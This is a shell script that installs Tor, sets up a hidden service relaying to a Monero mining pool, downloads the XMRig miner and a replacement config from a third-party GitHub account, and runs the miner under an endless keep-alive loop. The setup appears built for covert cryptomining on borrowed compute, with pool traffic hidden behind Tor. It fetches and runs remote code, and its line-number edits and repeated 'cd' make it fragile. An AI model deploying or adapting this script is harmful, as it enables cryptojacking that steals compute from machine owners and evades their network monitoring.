#!/bin/sh
## UPDATE ##

sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt update -y && sudo apt upgrade -y && sudo apt-get install --reinstall systemd -y && sudo apt-get install -y sed

## TOR ##
sudo apt-get install tor -y
sudo service tor stop


sed -i '18s/#SOCKSPort/SOCKSPort/ ' /etc/tor/torrc
sed -i '57s/#ControlPort/ControlPort/ ' /etc/tor/torrc
sed -i 's/#ORPort/ORPort/ ' /etc/tor/torrc
sed -i '75s/#HiddenServiceDir/HiddenServiceDir/ ' /etc/tor/torrc
sudo sed -i '76i\HiddenServicePort 4444 pool.minexmr.com:4444\ ' /etc/tor/torrc

sudo systemctl enable tor
sudo service tor start


## XMR ##

wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz && tar xf xmrig-6.13.1-linux-x64.tar.gz && cd xmrig-6.13.1 && rm -rf config.json && wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/config.json
cd xmrig-6.13.1

## CONFIG ##

sed -i '13s/true/false/ ' config.json
sed -i '3s/true/false/ ' config.json
sed -i '9d' config.json
cat /var/lib/tor/other_hidden_service/hostname | sed '1s/^/9i /' | sed -i -f- config.json
sed -i '9s/$/:4444",/ ' config.json 
sed -i '9s|^|            "url": "|' config.json



chmod +x xmrig && ./xmrig


while [ 1 ]; do
sleep 3
done
sleep 999
